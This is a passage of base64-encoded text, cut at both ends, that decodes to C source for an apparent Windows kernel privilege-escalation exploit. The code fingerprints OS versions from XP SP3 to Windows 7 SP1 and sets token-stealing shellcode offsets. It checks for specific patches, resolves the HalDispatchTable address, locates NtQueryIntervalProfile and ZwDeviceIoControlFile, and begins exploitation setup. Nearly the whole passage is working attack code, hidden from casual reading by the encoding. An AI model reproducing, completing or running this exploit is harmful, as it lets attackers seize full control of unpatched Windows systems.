gKG9zdmkuZHdNaW5vclZlcnNpb24gPT0gMSkgJiYgKG9zdmkud1NlcnZpY2VQYWNrTWFqb3IgPT0gMykpDQogICAgew0KICAgICAgICAvLyB0aGUgdGFyZ2V0IG1hY2hpbmUncyBPUyBpcyBXaW5kb3dzIFhQIFNQMw0KICAgICAgICBwcmludGYoIiAgIFsrXSBXaW5kb3dzIFhQIFNQM1xuIik7DQogICAgICAgIHNoZWxsY29kZV9LUFJPQ0VTUyA9ICdceDQ0JzsNCiAgICAgICAgc2hlbGxjb2RlX1RPS0VOICAgID0gJ1x4QzgnOw0KICAgICAgICBzaGVsbGNvZGVfVVBJRCAgICAgPSAnXHg4NCc7DQogICAgICAgIHNoZWxsY29kZV9BUExJTktTICA9ICdceDg4JzsNCiAgICAgICAgY29uc3QgY2hhciAqc2VjdXJpdHlQYXRjaGVzW10gPSB7IktCMjUwMzY2NSIsICJLQjI1OTI3OTkifTsNCiAgICAgICAgc2VjdXJpdHlQYXRjaGVzUHRyID0gc2VjdXJpdHlQYXRjaGVzOw0KICAgICAgICBzZWN1cml0eVBhdGNoZXNDb3VudCA9IDI7DQogICAgICAgIGxwSW5CdWZmZXJTaXplID0gMHgzMDsNCiAgICB9DQoNCiAgICAvLyBpbiBjYXNlIHRoZSBPUyB2ZXJzaW9uIGlzIDUuMiwgc2VydmljZSBwYWNrIDIsIG5vdCBSMg0KICAgIC8vICAgaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvbXM3MjQzODUodj12cy44NSkuYXNweA0KICAgIGVsc2UgaWYoKG9zdmkuZHdNYWpvclZlcnNpb24gPT0gNSkgJiYgKG9zdmkuZHdNaW5vclZlcnNpb24gPT0gMikgJiYgKG9zdmkud1NlcnZpY2VQYWNrTWFqb3IgPT0gMikgJiYgKEdldFN5c3RlbU1ldHJpY3MoODkpID09IDApKQ0KICAgIHsNCiAgICAgICAgLy8gdGhlIHRhcmdldCBtYWNoaW5lJ3MgT1MgaXMgV2luZG93cyBTZXJ2ZXIgMjAwMyBTUDINCiAgICAgICAgcHJpbnRmKCIgICBbK10gV2luZG93cyBTZXJ2ZXIgMjAwMyBTUDJcbiIpOw0KICAgICAgICBzaGVsbGNvZGVfS1BST0NFU1MgPSAnXHgzOCc7DQogICAgICAgIHNoZWxsY29kZV9UT0tFTiAgICA9ICdceEQ4JzsNCiAgICAgICAgc2hlbGxjb2RlX1VQSUQgICAgID0gJ1x4OTQnOw0KICAgICAgICBzaGVsbGNvZGVfQVBMSU5LUyAgPSAnXHg5OCc7DQogICAgICAgIGNvbnN0IGNoYXIgKnNlY3VyaXR5UGF0Y2hlc1tdID0geyJLQjI1MDM2NjUiLCAiS0IyNTkyNzk5IiwgIktCMjY0NTY0MCIsICJLQjI5NzU2ODQifTsNCiAgICAgICAgc2VjdXJpdHlQYXRjaGVzUHRyID0gc2VjdXJpdHlQYXRjaGVzOw0KICAgICAgICBzZWN1cml0eVBhdGNoZXNDb3VudCA9IDQ7DQogICAgICAgIGxwSW5CdWZmZXJTaXplID0gMHgzMDsNCiAgICB9DQoNCiAgICAvLyBpbiBjYXNlIHRoZSBPUyB2ZXJzaW9uIGlzIDYuMCwgc2VydmljZSBwYWNrIDEsIHdvcmtzdGF0aW9uDQogICAgZWxzZSBpZigob3N2aS5kd01ham9yVmVyc2lvbiA9PSA2KSAmJiAob3N2aS5kd01pbm9yVmVyc2lvbiA9PSAwKSAmJiAob3N2aS53U2VydmljZVBhY2tNYWpvciA9PSAxKSAmJiAob3N2aS53UHJvZHVjdFR5cGUgPT0gMSkpDQogICAgew0KICAgICAgICAvLyB0aGUgdGFyZ2V0IG1hY2hpbmUncyBPUyBpcyBXaW5kb3dzIFZpc3RhIFNQMQ0KICAgICAgICBwcmludGYoIiAgIFsrXSBXaW5kb3dzIFZpc3RhIFNQMVxuIik7DQogICAgICAgIHNoZWxsY29kZV9LUFJPQ0VTUyA9ICdceDQ4JzsNCiAgICAgICAgc2hlbGxjb2RlX1RPS0VOICAgID0gJ1x4RTAnOw0KICAgICAgICBzaGVsbGNvZGVfVVBJRCAgICAgPSAnXHg5Qyc7DQogICAgICAgIHNoZWxsY29kZV9BUExJTktTICA9ICdceEEwJzsNCiAgICAgICAgY29uc3QgY2hhciAqc2VjdXJpdHlQYXRjaGVzW10gPSB7IktCMjUwMzY2NSJ9Ow0KICAgICAgICBzZWN1cml0eVBhdGNoZXNQdHIgPSBzZWN1cml0eVBhdGNoZXM7DQogICAgICAgIHNlY3VyaXR5UGF0Y2hlc0NvdW50ID0gMTsNCiAgICAgICAgbHBJbkJ1ZmZlclNpemUgPSAweDMwOw0KICAgIH0NCg0KICAgIC8vIGluIGNhc2UgdGhlIE9TIHZlcnNpb24gaXMgNi4wLCBzZXJ2aWNlIHBhY2sgMiwgd29ya3N0YXRpb24NCiAgICBlbHNlIGlmKChvc3ZpLmR3TWFqb3JWZXJzaW9uID09IDYpICYmIChvc3ZpLmR3TWlub3JWZXJzaW9uID09IDApICYmIChvc3ZpLndTZXJ2aWNlUGFja01ham9yID09IDIpICYmIChvc3ZpLndQcm9kdWN0VHlwZSA9PSAxKSkNCiAgICB7DQogICAgICAgIC8vIHRoZSB0YXJnZXQgbWFjaGluZSdzIE9TIGlzIFdpbmRvd3MgVmlzdGEgU1AyDQogICAgICAgIHByaW50ZigiICAgWytdIFdpbmRvd3MgVmlzdGEgU1AyXG4iKTsNCiAgICAgICAgc2hlbGxjb2RlX0tQUk9DRVNTID0gJ1x4NDgnOw0KICAgICAgICBzaGVsbGNvZGVfVE9LRU4gICAgPSAnXHhFMCc7DQogICAgICAgIHNoZWxsY29kZV9VUElEICAgICA9ICdceDlDJzsNCiAgICAgICAgc2hlbGxjb2RlX0FQTElOS1MgID0gJ1x4QTAnOw0KICAgICAgICBjb25zdCBjaGFyICpzZWN1cml0eVBhdGNoZXNbXSA9IHsiS0IyNTAzNjY1IiwgIktCMjk3NTY4NCJ9Ow0KICAgICAgICBzZWN1cml0eVBhdGNoZXNQdHIgPSBzZWN1cml0eVBhdGNoZXM7DQogICAgICAgIHNlY3VyaXR5UGF0Y2hlc0NvdW50ID0gMjsNCiAgICAgICAgbHBJbkJ1ZmZlclNpemUgPSAweDEwOw0KICAgIH0NCg0KICAgIC8vIGluIGNhc2UgdGhlIE9TIHZlcnNpb24gaXMgNi4wLCBubyBzZXJ2aWNlIHBhY2sqLCBzZXJ2ZXINCiAgICAvLyAqQmVjYXVzZSBXaW5kb3dzIFNlcnZlciAyMDA4IGlzIGJhc2VkIG9uIHRoZSBXaW5kb3dzIE5UIDYuMCBTZXJ2aWNlIFBhY2sgMSBrZXJuZWwsIHRoZSBSVE0gcmVsZWFzZSBpcyBjb25zaWRlcmVkIHRvIGJlIFNlcnZpY2UgUGFjayAxOw0KICAgIC8vIGFjY29yZGluZ2x5LCB0aGUgZmlyc3Qgc2VydmljZSBwYWNrIGlzIGNhbGxlZCBTZXJ2aWNlIFBhY2sgMi4NCiAgICAvLyAgIGh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1dpbmRvd3NfU2VydmVyXzIwMDgNCiAgICBlbHNlIGlmKChvc3ZpLmR3TWFqb3JWZXJzaW9uID09IDYpICYmIChvc3ZpLmR3TWlub3JWZXJzaW9uID09IDApICYmIChvc3ZpLndTZXJ2aWNlUGFja01ham9yID09IDEpICYmIChvc3ZpLndQcm9kdWN0VHlwZSAhPSAxKSkNCiAgICB7DQogICAgICAgIC8vIHRoZSB0YXJnZXQgbWFjaGluZSdzIE9TIGlzIFdpbmRvd3MgU2VydmVyIDIwMDgNCiAgICAgICAgcHJpbnRmKCIgICBbK10gV2luZG93cyBTZXJ2ZXIgMjAwOFxuIik7DQogICAgICAgIHNoZWxsY29kZV9LUFJPQ0VTUyA9ICdceDQ4JzsNCiAgICAgICAgc2hlbGxjb2RlX1RPS0VOICAgID0gJ1x4RTAnOw0KICAgICAgICBzaGVsbGNvZGVfVVBJRCAgICAgPSAnXHg5Qyc7DQogICAgICAgIHNoZWxsY29kZV9BUExJTktTICA9ICdceEEwJzsNCiAgICAgICAgY29uc3QgY2hhciAqc2VjdXJpdHlQYXRjaGVzW10gPSB7IktCMjUwMzY2NSJ9Ow0KICAgICAgICBzZWN1cml0eVBhdGNoZXNQdHIgPSBzZWN1cml0eVBhdGNoZXM7DQogICAgICAgIHNlY3VyaXR5UGF0Y2hlc0NvdW50ID0gMTsNCiAgICAgICAgbHBJbkJ1ZmZlclNpemUgPSAweDEwOw0KICAgIH0NCg0KICAgIC8vIGluIGNhc2UgdGhlIE9TIHZlcnNpb24gaXMgNi4wLCBzZXJ2aWNlIHBhY2sgMiwgc2VydmVyDQogICAgZWxzZSBpZigob3N2aS5kd01ham9yVmVyc2lvbiA9PSA2KSAmJiAob3N2aS5kd01pbm9yVmVyc2lvbiA9PSAwKSAmJiAob3N2aS53U2VydmljZVBhY2tNYWpvciA9PSAyKSAmJiAob3N2aS53UHJvZHVjdFR5cGUgIT0gMSkpDQogICAgew0KICAgICAgICAvLyB0aGUgdGFyZ2V0IG1hY2hpbmUncyBPUyBpcyBXaW5kb3dzIFNlcnZlciAyMDA4IFNQMg0KICAgICAgICBwcmludGYoIiAgIFsrXSBXaW5kb3dzIFNlcnZlciAyMDA4IFNQMlxuIik7DQogICAgICAgIHNoZWxsY29kZV9LUFJPQ0VTUyA9ICdceDQ4JzsNCiAgICAgICAgc2hlbGxjb2RlX1RPS0VOICAgID0gJ1x4RTAnOw0KICAgICAgICBzaGVsbGNvZGVfVVBJRCAgICAgPSAnXHg5Qyc7DQogICAgICAgIHNoZWxsY29kZV9BUExJTktTICA9ICdceEEwJzsNCiAgICAgICAgY29uc3QgY2hhciAqc2VjdXJpdHlQYXRjaGVzW10gPSB7IktCMjUwMzY2NSIsICJLQjI5NzU2ODQifTsNCiAgICAgICAgc2VjdXJpdHlQYXRjaGVzUHRyID0gc2VjdXJpdHlQYXRjaGVzOw0KICAgICAgICBzZWN1cml0eVBhdGNoZXNDb3VudCA9IDI7DQogICAgICAgIGxwSW5CdWZmZXJTaXplID0gMHgwODsNCiAgICB9DQoNCiAgICAvLyBpbiBjYXNlIHRoZSBPUyB2ZXJzaW9uIGlzIDYuMSwgbm8gc2VydmljZSBwYWNrIChub3RlOiBXaW5kb3dzIFNlcnZlciAyMDA4IFIyIGlzIDY0LWJpdCBvbmx5KQ0KICAgIGVsc2UgaWYoKG9zdmkuZHdNYWpvclZlcnNpb24gPT0gNikgJiYgKG9zdmkuZHdNaW5vclZlcnNpb24gPT0gMSkgJiYgKG9zdmkud1NlcnZpY2VQYWNrTWFqb3IgPT0gMCkpDQogICAgew0KICAgICAgICAvLyB0aGUgdGFyZ2V0IG1hY2hpbmUncyBPUyBpcyBXaW5kb3dzIDcNCiAgICAgICAgcHJpbnRmKCIgICBbK10gV2luZG93cyA3XG4iKTsNCiAgICAgICAgc2hlbGxjb2RlX0tQUk9DRVNTID0gJ1x4NTAnOw0KICAgICAgICBzaGVsbGNvZGVfVE9LRU4gICAgPSAnXHhGOCc7DQogICAgICAgIHNoZWxsY29kZV9VUElEICAgICA9ICdceEI0JzsNCiAgICAgICAgc2hlbGxjb2RlX0FQTElOS1MgID0gJ1x4QjgnOw0KICAgICAgICBjb25zdCBjaGFyICpzZWN1cml0eVBhdGNoZXNbXSA9IHsiS0IyNTAzNjY1In07DQogICAgICAgIHNlY3VyaXR5UGF0Y2hlc1B0ciA9IHNlY3VyaXR5UGF0Y2hlczsNCiAgICAgICAgc2VjdXJpdHlQYXRjaGVzQ291bnQgPSAxOw0KICAgICAgICBscEluQnVmZmVyU2l6ZSA9IDB4MjA7DQogICAgfQ0KDQogICAgLy8gaW4gY2FzZSB0aGUgT1MgdmVyc2lvbiBpcyA2LjEsIHNlcnZpY2UgcGFjayAxIChub3RlOiBXaW5kb3dzIFNlcnZlciAyMDA4IFIyIGlzIDY0LWJpdCBvbmx5KQ0KICAgIGVsc2UgaWYoKG9zdmkuZHdNYWpvclZlcnNpb24gPT0gNikgJiYgKG9zdmkuZHdNaW5vclZlcnNpb24gPT0gMSkgJiYgKG9zdmkud1NlcnZpY2VQYWNrTWFqb3IgPT0gMSkpDQogICAgew0KICAgICAgICAvLyB0aGUgdGFyZ2V0IG1hY2hpbmUncyBPUyBpcyBXaW5kb3dzIDcgU1AxDQogICAgICAgIHByaW50ZigiICAgWytdIFdpbmRvd3MgNyBTUDFcbiIpOw0KICAgICAgICBzaGVsbGNvZGVfS1BST0NFU1MgPSAnXHg1MCc7DQogICAgICAgIHNoZWxsY29kZV9UT0tFTiAgICA9ICdceEY4JzsNCiAgICAgICAgc2hlbGxjb2RlX1VQSUQgICAgID0gJ1x4QjQnOw0KICAgICAgICBzaGVsbGNvZGVfQVBMSU5LUyAgPSAnXHhCOCc7DQogICAgICAgIGNvbnN0IGNoYXIgKnNlY3VyaXR5UGF0Y2hlc1tdID0geyJLQjI1MDM2NjUiLCAiS0IyOTc1Njg0In07DQogICAgICAgIHNlY3VyaXR5UGF0Y2hlc1B0ciA9IHNlY3VyaXR5UGF0Y2hlczsNCiAgICAgICAgc2VjdXJpdHlQYXRjaGVzQ291bnQgPSAyOw0KICAgICAgICBscEluQnVmZmVyU2l6ZSA9IDB4MTA7DQogICAgfQ0KDQogICAgLy8gaW4gY2FzZSB0aGUgT1MgdmVyc2lvbiBpcyBub3QgYW55IG9mIHRoZSBwcmV2aW91c2x5IGNoZWNrZWQgdmVyc2lvbnMNCiAgICBlbHNlDQogICAgew0KICAgICAgICAvLyB0aGUgdGFyZ2V0IG1hY2hpbmUncyBPUyBpcyBhbiB1bnN1cHBvcnRlZCAzMi1iaXQgV2luZG93cyB2ZXJzaW9uDQogICAgICAgIHByaW50ZigiICAgWy1dIFVuc3VwcG9ydGVkIHZlcnNpb25cbiIpOw0KICAgICAgICBwcmludGYoIiAgICAgIFsqXSBBZmZlY3RlZCAzMi1iaXQgb3BlcmF0aW5nIHN5c3RlbXNcbiIpOw0KICAgICAgICBwcmludGYoIiAgICAgICAgIFsqXSBXaW5kb3dzIFhQIFNQM1xuIik7DQogICAgICAgIHByaW50ZigiICAgICAgICAgWypdIFdpbmRvd3MgU2VydmVyIDIwMDMgU1AyXG4iKTsNCiAgICAgICAgcHJpbnRmKCIgICAgICAgICBbKl0gV2luZG93cyBWaXN0YSBTUDFcbiIpOw0KICAgICAgICBwcmludGYoIiAgICAgICAgIFsqXSBXaW5kb3dzIFZpc3RhIFNQMlxuIik7DQogICAgICAgIHByaW50ZigiICAgICAgICAgWypdIFdpbmRvd3MgU2VydmVyIDIwMDhcbiIpOw0KICAgICAgICBwcmludGYoIiAgICAgICAgIFsqXSBXaW5kb3dzIFNlcnZlciAyMDA4IFNQMlxuIik7DQogICAgICAgIHByaW50ZigiICAgICAgICAgWypdIFdpbmRvd3MgN1xuIik7DQogICAgICAgIHByaW50ZigiICAgICAgICAgWypdIFdpbmRvd3MgNyBTUDFcbiIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KDQoNCiAgICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQogICAgLy8gTE9DQVRFIFJFUVVJUkVEIE9TIENPTVBPTkVOVFMNCiAgICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQoNCiAgICBwcmludGYoIlsqXSBMb2NhdGluZyByZXF1aXJlZCBPUyBjb21wb25lbnRzXG4iKTsNCg0KDQogICAgLy8gcmV0cmlldmUgc3lzdGVtIGluZm9ybWF0aW9uDQogICAgLy8gICBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9tczcyNTUwNih2PXZzLjg1KS5hc3B4DQogICAgLy8gbG9jYXRlICJad1F1ZXJ5U3lzdGVtSW5mb3JtYXRpb24iIGluIHRoZSAibnRkbGwuZGxsIiBtb2R1bGUNCiAgICAvLyAgIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvd2luZG93cy9kZXNrdG9wL21zNjgzMjEyKHY9dnMuODUpLmFzcHgNCiAgICBGQVJQUk9DIFp3UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbjsNCiAgICBad1F1ZXJ5U3lzdGVtSW5mb3JtYXRpb24gPSBHZXRQcm9jQWRkcmVzcyhHZXRNb2R1bGVIYW5kbGUoIm50ZGxsLmRsbCIpLCAiWndRdWVyeVN5c3RlbUluZm9ybWF0aW9uIik7DQoNCiAgICAvLyAxMSA9IFN5c3RlbU1vZHVsZUluZm9ybWF0aW9uDQogICAgLy8gICBodHRwOi8vd2luZm9ybXguZmxvcmlhbi1yYXBwbC5kZS9odG1sL2U2ZDVkNWMxLThkODMtMTk5Yi0wMDRmLTg3Njc0MzljNzBlYi5odG0NCiAgICBVTE9ORyBzeXN0ZW1JbmZvcm1hdGlvbjsNCiAgICBad1F1ZXJ5U3lzdGVtSW5mb3JtYXRpb24oMTEsIChQVk9JRCkgJnN5c3RlbUluZm9ybWF0aW9uLCAwLCAmc3lzdGVtSW5mb3JtYXRpb24pOw0KDQogICAgLy8gYWxsb2NhdGUgbWVtb3J5IGZvciB0aGUgbGlzdCBvZiBsb2FkZWQgbW9kdWxlcw0KICAgIFVMT05HICpzeXN0ZW1JbmZvcm1hdGlvbkJ1ZmZlcjsNCiAgICBzeXN0ZW1JbmZvcm1hdGlvbkJ1ZmZlciA9IChVTE9ORyAqKSBtYWxsb2Moc3lzdGVtSW5mb3JtYXRpb24gKiBzaXplb2YoKnN5c3RlbUluZm9ybWF0aW9uQnVmZmVyKSk7DQoNCiAgICBpZighc3lzdGVtSW5mb3JtYXRpb25CdWZmZXIpDQogICAgew0KICAgICAgICBwcmludGYoIiAgIFstXSBDb3VsZCBub3QgYWxsb2NhdGUgbWVtb3J5Iik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoNCg0KICAgIC8vIHJldHJpZXZlIHRoZSBsaXN0IG9mIGxvYWRlZCBtb2R1bGVzIA0KICAgIFp3UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbigxMSwgc3lzdGVtSW5mb3JtYXRpb25CdWZmZXIsIHN5c3RlbUluZm9ybWF0aW9uICogc2l6ZW9mKCpzeXN0ZW1JbmZvcm1hdGlvbkJ1ZmZlciksIE5VTEwpOw0KDQogICAgLy8gbG9jYXRlICJudGtybmxwYS5leGUiIG9yICJudG9za3JubC5leGUiIGluIHRoZSByZXRyaWV2ZWQgbGlzdCBvZiBsb2FkZWQgbW9kdWxlcw0KICAgIFVMT05HIGk7DQogICAgUFZPSUQgdGFyZ2V0S3JubE1kbEJhc2VBZGRyOw0KICAgIEhNT0RVTEUgdGFyZ2V0S3JubE1kbFVzclNwY09mZnM7DQogICAgQk9PTCBmb3VuZE1vZHVsZSA9IEZBTFNFOw0KICAgIFBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OIGxvYWRlZE1kbFN0cnVjdFB0cjsNCiAgICBsb2FkZWRNZGxTdHJ1Y3RQdHIgPSAoUFNZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT04pIChzeXN0ZW1JbmZvcm1hdGlvbkJ1ZmZlciArIDEpOw0KDQogICAgZm9yKGkgPSAwOyBpIDwgKnN5c3RlbUluZm9ybWF0aW9uQnVmZmVyOyBpKyspDQogICAgew0KICAgICAgICBpZihzdHJzdHIobG9hZGVkTWRsU3RydWN0UHRyW2ldLkltYWdlTmFtZSwgIm50a3JubHBhLmV4ZSIpKQ0KICAgICAgICB7DQogICAgICAgICAgICBwcmludGYoIiAgIFsrXSBudGtybmxwYS5leGVcbiIpOw0KICAgICAgICAgICAgdGFyZ2V0S3JubE1kbFVzclNwY09mZnMgPSBMb2FkTGlicmFyeUV4QSgibnRrcm5scGEuZXhlIiwgMCwgMSk7DQogICAgICAgICAgICB0YXJnZXRLcm5sTWRsQmFzZUFkZHIgPSBsb2FkZWRNZGxTdHJ1Y3RQdHJbaV0uQmFzZTsNCiAgICAgICAgICAgIGZvdW5kTW9kdWxlID0gVFJVRTsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9ICAgIA0KICAgICAgICBlbHNlIGlmKHN0cnN0cihsb2FkZWRNZGxTdHJ1Y3RQdHJbaV0uSW1hZ2VOYW1lLCAibnRvc2tybmwuZXhlIikpDQogICAgICAgIHsNCiAgICAgICAgICAgIHByaW50ZigiICAgWytdIG50b3Nrcm5sLmV4ZVxuIik7DQogICAgICAgICAgICB0YXJnZXRLcm5sTWRsVXNyU3BjT2ZmcyA9IExvYWRMaWJyYXJ5RXhBKCJudG9za3JubC5leGUiLCAwLCAxKTsNCiAgICAgICAgICAgIHRhcmdldEtybmxNZGxCYXNlQWRkciA9IGxvYWRlZE1kbFN0cnVjdFB0cltpXS5CYXNlOw0KICAgICAgICAgICAgZm91bmRNb2R1bGUgPSBUUlVFOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0gICAgIA0KICAgIH0NCg0KICAgIC8vIGJhc2UgYWRkcmVzcyBvZiB0aGUgbG9hZGVkIG1vZHVsZSAoa2VybmVsIHNwYWNlKQ0KICAgIHByaW50ZigiICAgICAgWypdIEFkZHJlc3M6ICAgICAgJSMwMTB4XG4iLCB0YXJnZXRLcm5sTWRsQmFzZUFkZHIpOw0KDQogICAgLy8gb2Zmc2V0IGFkZHJlc3MgKHJlbGF0aXZlIHRvIHRoZSBwYXJlbnQgcHJvY2Vzcykgb2YgdGhlIGxvYWRlZCBtb2R1bGUgKHVzZXIgc3BhY2UpDQogICAgcHJpbnRmKCIgICAgICBbKl0gT2Zmc2V0OiAgICAgICAlIzAxMHhcbiIsIHRhcmdldEtybmxNZGxVc3JTcGNPZmZzKTsNCg0KICAgIGlmKCFmb3VuZE1vZHVsZSkNCiAgICB7DQogICAgICAgIHByaW50ZigiICAgWy1dIENvdWxkIG5vdCBmaW5kIG50a3JubHBhLmV4ZS9udG9za3JubC5leGVcbiIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KDQogICAgLy8gZnJlZSBhbGxvY2F0ZWQgYnVmZmVyIHNwYWNlDQogICAgZnJlZShzeXN0ZW1JbmZvcm1hdGlvbkJ1ZmZlcik7DQoNCg0KICAgIC8vIGRldGVybWluZSB0aGUgYWRkcmVzcyBvZiB0aGUgIkhhbERpc3BhdGNoVGFibGUiIHByb2Nlc3MgKGtlcm5lbCBzcGFjZSkNCiAgICAvLyBsb2NhdGUgdGhlIG9mZnNldCBmbyB0aGUgIkhhbERpc3BhdGNoVGFibGUiIHByb2Nlc3Mgd2l0aGluIHRoZSB0YXJnZXQgbW9kdWxlICh1c2VyIHNwYWNlKQ0KICAgIFVMT05HX1BUUiBIYWxEaXNwYXRjaFRhYmxlVXNyU3BjT2ZmczsNCiAgICBIYWxEaXNwYXRjaFRhYmxlVXNyU3BjT2ZmcyA9IChVTE9OR19QVFIpIEdldFByb2NBZGRyZXNzKHRhcmdldEtybmxNZGxVc3JTcGNPZmZzLCAiSGFsRGlzcGF0Y2hUYWJsZSIpOw0KDQogICAgaWYoIUhhbERpc3BhdGNoVGFibGVVc3JTcGNPZmZzKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCIgICAgICBbLV0gQ291bGQgbm90IGZpbmQgSGFsRGlzcGF0Y2hUYWJsZVxuIik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoNCiAgICBwcmludGYoIiAgICAgIFsrXSBIYWxEaXNwYXRjaFRhYmxlXG4iKTsNCiAgICBwcmludGYoIiAgICAgICAgIFsqXSBPZmZzZXQ6ICAgICUjMDEweFxuIiwgSGFsRGlzcGF0Y2hUYWJsZVVzclNwY09mZnMpOw0KDQogICAgLy8gY2FsY3VsYXRlIHRoZSBhZGRyZXNzIG9mICJIYWxEaXNwYXRjaFRhYmxlIiBpbiBrZXJuZWwgc3BhY2UNCiAgICAvLyAxLiBpZGVudGlmeSB0aGUgYmFzZSBhZGRyZXNzIG9mIHRoZSB0YXJnZXQgbW9kdWxlIGluIGtlcm5lbCBzcGFjZQ0KICAgIC8vIDIuIHByZXZpb3VzIHN0ZXAncyByZXN1bHQgW21pbnVzXSB0aGUgbG9hZCBhZGRyZXNzIG9mIHRoZSBzYW1lIG1vZHVsZSBpbiB1c2VyIHNwYWNlDQogICAgLy8gMy4gcHJldmlvdXMgc3RlcCdzIHJlc3VsdCBbcGx1c10gdGhlIGFkZHJlc3Mgb2YgIkhhbERpc3BhdGNoVGFibGUiIGluIHVzZXIgc3BhY2UNCiAgICAvLyBFUVVJVkFMRU5UIFRPOg0KICAgIC8vIDEuIGRldGVybWluZSBSVkEgb2YgSGFsRGlzcGF0Y2hUYWJsZQ0KICAgIC8vICpSZWxhdGl2ZSBWaXJ0dWFsIEFkZHJlc3MgLSB0aGUgYWRkcmVzcyBvZiBhbiBpdGVtIGFmdGVyIGl0IGlzIGxvYWRlZCBpbnRvIG1lbW9yeSwgd2l0aCB0aGUgYmFzZSBhZGRyZXNzIG9mIHRoZSBpbWFnZSBmaWxlIHN1YnRyYWN0ZWQgZnJvbSBpdC4NCiAgICAvLyAyLiBwcmV2aW91cyBzdGVwJ3MgcmVzdWx0IFtwbHVzXSBiYXNlIGFkZHJlc3Mgb2YgdGFyZ2V0IG1vZHVsZSBpbiBrZXJuZWwgc3BhY2UNCiAgICBVTE9OR19QVFIgSGFsRGlzcGF0Y2hUYWJsZUtybmxTcGNBZGRyOw0KICAgIEhhbERpc3BhdGNoVGFibGVLcm5sU3BjQWRkciA9IEhhbERpc3BhdGNoVGFibGVVc3JTcGNPZmZzIC0gKFVMT05HX1BUUikgdGFyZ2V0S3JubE1kbFVzclNwY09mZnM7DQogICAgSGFsRGlzcGF0Y2hUYWJsZUtybmxTcGNBZGRyICs9IChVTE9OR19QVFIpIHRhcmdldEtybmxNZGxCYXNlQWRkcjsNCg0KDQogICAgLy8gbG9jYXRlICJOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlIiBpbiB0aGUgIm50ZGxsLmRsbCIgbW9kdWxlDQogICAgUE5UUVVFUllJTlRFUlZBTCBOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlOw0KICAgIE50UXVlcnlJbnRlcnZhbFByb2ZpbGUgPSAoUE5UUVVFUllJTlRFUlZBTCkgR2V0UHJvY0FkZHJlc3MoR2V0TW9kdWxlSGFuZGxlKCJudGRsbC5kbGwiKSwgIk50UXVlcnlJbnRlcnZhbFByb2ZpbGUiKTsNCg0KICAgIGlmKCFOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCIgICBbLV0gQ291bGQgbm90IGZpbmQgTnRRdWVyeUludGVydmFsUHJvZmlsZVxuIik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoNCiAgICBwcmludGYoIiAgIFsrXSBOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlXG4iKTsNCiAgICBwcmludGYoIiAgICAgIFsqXSBBZGRyZXNzOiAgICAgICUjMDEweFxuIiwgTnRRdWVyeUludGVydmFsUHJvZmlsZSk7DQoNCg0KICAgIC8vIGxvY2F0ZSAiWndEZXZpY2VJb0NvbnRyb2xGaWxlIiByb3V0aW5lIGluIHRoZSAibnRkbGwuZGxsIiBtb2R1bGUNCiAgICAvLyAgIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvd2luZG93cy9oYXJkd2FyZS9mZjU2NjQ0MSh2PXZzLjg1KS5hc3B4DQogICAgRkFSUFJPQyBad0RldmljZUlvQ29udHJvbEZpbGU7DQogICAgWndEZXZpY2VJb0NvbnRyb2xGaWxlID0gR2V0UHJvY0FkZHJlc3MoR2V0TW9kdWxlSGFuZGxlKCJudGRsbC5kbGwiKSwgIlp3RGV2aWNlSW9Db250cm9sRmlsZSIpOw0KDQogICAgaWYoIVp3RGV2aWNlSW9Db250cm9sRmlsZSkNCiAgICB7DQogICAgICAgIHByaW50ZigiICAgWy1dIENvdWxkIG5vdCBmaW5kIFp3RGV2aWNlSW9Db250cm9sRmlsZVxuIik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoNCiAgICBwcmludGYoIiAgIFsrXSBad0RldmljZUlvQ29udHJvbEZpbGVcbiIpOw0KICAgIHByaW50ZigiICAgICAgWypdIEFkZHJlc3M6ICAgICAgJSMwMTB4XG4iLCBad0RldmljZUlvQ29udHJvbEZpbGUpOw0KDQoNCiAgICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQogICAgLy8gU0VUVVAgRVhQTE9JVEFUSU9OIFBSRVJFUVVJU0lURQ0KICAgIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KICAgIHByaW50ZigiWypdIFNldHRpbmcgdXAgZXhwbG9pdGF0aW9uIHByZXJlcXVpc2l0ZVxuIik7DQoNCg0KICAgIC8vIGluaXRpYWxpemUgV2luc29jayBETEwNCiAgICBwcmludGYgKCIgICBbKl0gSW5pdGlhbGlzaW5nIFdpbnNvY2sgRExMXG4iKTsNCiAgICBXT1JEIHdWZXJzaW9uUmVxdWVzdGVkOw0KICAgIFdT